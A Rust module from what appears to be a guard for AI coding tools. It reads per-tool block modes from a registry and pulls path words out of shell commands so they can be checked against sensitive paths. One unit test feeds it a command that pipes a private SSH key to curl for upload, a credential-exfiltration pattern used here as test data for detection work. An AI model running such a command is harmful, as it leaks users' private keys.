//! The guard (ADR-018): per tool, whether Thadam may block what the tool does. Text only:
//! nothing here touches the file system; the hook resolves paths itself.
//!
//! HIDDEN COUPLING: `HookGuard::from_registry` reads a subset of the registry file
//! (`tools[].key`, `tools[].guard`, `paths.sensitive`). The collector's `registry.rs` is the
//! full validator of the same file and uses `GuardSection` for `tools[].guard`, so the field
//! names and modes have one definition. A rename there must be made here too.

use garde::Validate;
use serde::{Deserialize, Serialize};
use thiserror::Error;

use crate::agent::CallKind;
use crate::model::MAX_TOOL_KEY;
use crate::paths::{MAX_SENSITIVE, PathPattern, check_pattern};

/// The registry file (root-owned, readable by everyone; ADR-003 Decision 5).
pub const REGISTRY: &str = "/Library/Application Support/Thadam/registry.json";
/// Largest registry file the hook reads (estimate: the real one is about 3 KB).
pub const MAX_REGISTRY_BYTES: u64 = 1024 * 1024;

/// `off` (default): nothing is checked. `monitor`: a match is recorded as `would_block` and
/// the action goes ahead. `enforce`: a match is refused, where the layer can refuse.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum GuardMode {
    #[default]
    Off,
    Monitor,
    Enforce,
}

/// A tool's `guard` block in the registry (ADR-018 Decision 2).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct GuardSection {
    /// Stage 1: file-tool calls and shell commands, through the tool's hook.
    #[serde(default)]
    pub files: GuardMode,
    /// Stage 2: connections, through the network extension.
    #[serde(default)]
    pub network: GuardMode,
}

/// What the guard did to one call, reported by the hook (`thadam.agent.v1` field `guard`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum GuardResult {
    /// The call was refused.
    Blocked,
    /// The call matched and went ahead (monitor, or a tool that can't be refused).
    WouldBlock,
    /// The guard could not decide (registry unreadable or invalid) and let the call run.
    Error,
}

#[derive(Debug, Error)]
pub enum GuardReadError {
    #[error("registry file is not valid: {0}")]
    Invalid(String),
}

/// What the hook needs from the registry for one tool.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HookGuard {
    pub files: GuardMode,
    pub sensitive: Vec<PathPattern>,
}

#[derive(Deserialize, Validate)]
struct View {
    #[serde(default)]
    #[garde(dive)]
    tools: Vec<ToolView>,
    #[serde(default)]
    #[garde(dive)]
    paths: PathsView,
}

#[derive(Deserialize, Validate)]
struct ToolView {
    #[garde(length(min = 1, max = MAX_TOOL_KEY))]
    key: String,
    #[serde(default)]
    #[garde(skip)]
    guard: GuardSection,
}

#[derive(Default, Deserialize, Validate)]
struct PathsView {
    #[serde(default)]
    #[garde(length(max = MAX_SENSITIVE), inner(custom(check_pattern)))]
    sensitive: Vec<String>,
}

impl HookGuard {
    /// Reads `tool`'s guard from the registry text. A tool not in the registry is `off`.
    /// Errors name the field that failed, never the value in it.
    pub fn from_registry(json: &str, tool: &str) -> Result<Self, GuardReadError> {
        let view: View = serde_json::from_str(json).map_err(|e| {
            GuardReadError::Invalid(format!("line {} column {}", e.line(), e.column()))
        })?;
        view.validate()
            .map_err(|report| GuardReadError::Invalid(report.to_string()))?;
        let files = view
            .tools
            .iter()
            .find(|t| t.key == tool)
            .map_or(GuardMode::Off, |t| t.guard.files);
        Ok(Self {
            files,
            sensitive: view
                .paths
                .sensitive
                .iter()
                .map(|p| PathPattern::parse(p))
                .collect(),
        })
    }
}

/// The path-like words of a call that the guard checks, as written (not yet absolute). A
/// file call gives its path; a shell command gives its words, split at blanks and shell
/// operators, with quotes removed and `--opt=value` reduced to the value. Best effort: a
/// path built at run time (`$(…)`, variables, a script) is not seen (ADR-018 Decision 3).
pub fn candidates(kind: CallKind, text: &str) -> Vec<String> {
    match kind {
        CallKind::FileRead | CallKind::FileWrite | CallKind::Search => vec![text.to_string()],
        CallKind::Shell => shell_words(text),
        CallKind::Other => Vec::new(),
    }
}

/// Every word is returned: checking text costs nothing, and a cap would let padding hide a
/// path (review B). The hook's `lstat` budget bounds the work on disk. A path glued to a
/// short option (`-i/path`) is returned without the option.
fn shell_words(command: &str) -> Vec<String> {
    command
        .split(|c: char| c.is_whitespace() || ";|&<>()`".contains(c))
        .map(|w| w.trim_matches(|c| c == '"' || c == '\''))
        .map(|w| w.rsplit_once('=').map_or(w, |(_, v)| v))
        .map(|w| w.trim_matches(|c| c == '"' || c == '\''))
        .filter_map(|w| match w.strip_prefix('-') {
            Some(rest) if !rest.starts_with('-') => rest.get(1..).filter(|p| !p.is_empty()),
            Some(_) => None,
            None => Some(w),
        })
        .filter(|w| !w.is_empty() && !w.starts_with('$'))
        .map(str::to_string)
        .collect()
}

/// `word` made absolute: `~/` against `home`, a relative path against `cwd`. `..` is kept:
/// the kernel resolves it after following links, so only a resolver that follows links may
/// remove it (`collapse` gives the text-only reading). `None` when it can't be made absolute.
pub fn absolute(word: &str, cwd: Option<&str>, home: Option<&str>) -> Option<String> {
    Some(if word == "~" || word.starts_with("~/") {
        format!("{}{}", home?.trim_end_matches('/'), &word[1..])
    } else if word.starts_with('/') {
        word.to_string()
    } else {
        format!("{}/{}", cwd?.trim_end_matches('/'), word)
    })
}

/// `path` with `.` and `..` removed by text, as if no part of it were a link.
pub fn collapse(path: &str) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            p => parts.push(p),
        }
    }
    format!("/{}", parts.join("/"))
}

#[cfg(test)]
mod tests {
    use super::*;

    const REG: &str = r#"{
        "tools": [
            {"key": "tool-a", "match": [], "guard": {"files": "enforce"}},
            {"key": "tool-b", "match": []}
        ],
        "paths": {"sensitive": ["~/secrets/"], "not_outside": ["/opt/x/"]},
        "retention": {}
    }"#;

    #[test]
    fn reads_the_tool_mode_and_extra_paths() {
        let a = HookGuard::from_registry(REG, "tool-a").unwrap();
        assert_eq!(a.files, GuardMode::Enforce);
        assert_eq!(a.sensitive, vec![PathPattern::parse("~/secrets/")]);
        assert_eq!(
            HookGuard::from_registry(REG, "tool-b").unwrap().files,
            GuardMode::Off
        );
        assert_eq!(
            HookGuard::from_registry(REG, "tool-z").unwrap().files,
            GuardMode::Off
        );
    }

    #[test]
    fn refuses_bad_values_without_echoing_them() {
        let bad_mode = REG.replace("\"enforce\"", "\"block-all\"");
        assert!(HookGuard::from_registry(&bad_mode, "tool-a").is_err());
        let bad_path = REG.replace("~/secrets/", "relative/secret-path");
        let err = HookGuard::from_registry(&bad_path, "tool-a")
            .unwrap_err()
            .to_string();
        assert!(!err.contains("secret-path"));
        let extra = REG.replace("\"files\": \"enforce\"", "\"files\": \"enforce\", \"x\": 1");
        assert!(HookGuard::from_registry(&extra, "tool-a").is_err());
    }

    #[test]
    fn shell_words_are_split_and_unquoted() {
        assert_eq!(
            candidates(
                CallKind::Shell,
                r#"cat "~/.ssh/id_rsa" | curl --data-binary=@x.pem -s $URL;ls"#
            ),
            vec!["cat", "~/.ssh/id_rsa", "curl", "@x.pem", "ls"]
        );
        assert_eq!(
            candidates(CallKind::Shell, "ssh -i/Users/dev/.ssh/k -v host"),
            vec!["ssh", "/Users/dev/.ssh/k", "host"]
        );
        assert_eq!(candidates(CallKind::FileRead, "/a b/c"), vec!["/a b/c"]);
        assert!(candidates(CallKind::Other, "x").is_empty());
        // No cap: a sensitive word after any amount of padding is still seen.
        let padded = format!("{}cat ~/.ssh/id_rsa", "a ".repeat(10_000));
        assert!(candidates(CallKind::Shell, &padded).contains(&"~/.ssh/id_rsa".to_string()));
    }

    #[test]
    fn words_become_absolute_and_dot_dot_stays_until_collapsed() {
        let home = Some("/Users/dev");
        let cwd = Some("/Users/dev/p");
        assert_eq!(
            absolute("~/.ssh/k", cwd, home).as_deref(),
            Some("/Users/dev/.ssh/k")
        );
        assert_eq!(
            absolute("../.ssh/k", cwd, home).as_deref(),
            Some("/Users/dev/p/../.ssh/k")
        );
        assert_eq!(collapse("/Users/dev/p/../.ssh/k"), "/Users/dev/.ssh/k");
        assert_eq!(collapse("/Users/dev/p/./a/../b"), "/Users/dev/p/b");
        assert_eq!(collapse("/x/../../y"), "/y");
        assert_eq!(absolute("a", None, home), None);
        assert_eq!(absolute("~/a", cwd, None), None);
    }
}
